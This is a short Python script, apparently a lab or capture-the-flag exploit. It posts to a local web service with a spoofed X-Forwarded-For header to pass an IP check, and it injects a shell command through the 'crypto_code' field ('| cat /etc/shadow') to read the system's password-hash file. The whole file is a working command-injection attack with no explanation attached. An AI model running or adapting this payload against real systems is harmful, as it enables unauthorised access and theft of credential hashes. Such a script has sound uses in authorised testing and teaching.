import requests

baseURL = 'http://127.0.0.1'

headers = {
    'X-Forwarded-For': '192.168.1.110'
}

payload = {
    'crypto_code': 'aasdsad | cat /etc/shadow'
}

req = requests.post(baseURL, data=payload, headers=headers)

print(req.text)